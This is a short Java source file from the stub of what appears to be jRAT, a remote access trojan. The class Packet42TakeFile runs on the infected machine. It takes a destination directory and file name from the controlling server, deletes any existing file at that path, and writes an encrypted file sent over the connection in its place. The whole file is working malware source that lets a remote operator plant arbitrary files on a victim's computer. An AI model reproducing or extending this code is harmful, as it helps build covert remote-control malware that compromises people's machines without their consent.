package pro.jrat.stub.packets.incoming;

import java.io.File;

import pro.jrat.common.io.FileIO;
import pro.jrat.stub.Connection;
import pro.jrat.stub.Main;



public class Packet42TakeFile extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String destdir = Connection.readLine();
		String filename = Connection.readLine();
		
		File file = new File(destdir + File.separator + filename);
		
		if (file.exists() && file.isFile()) {
			file.delete();
		}
		
		FileIO.readFile(file, Connection.dis, Connection.dos, null, Main.getKey());
	}

}
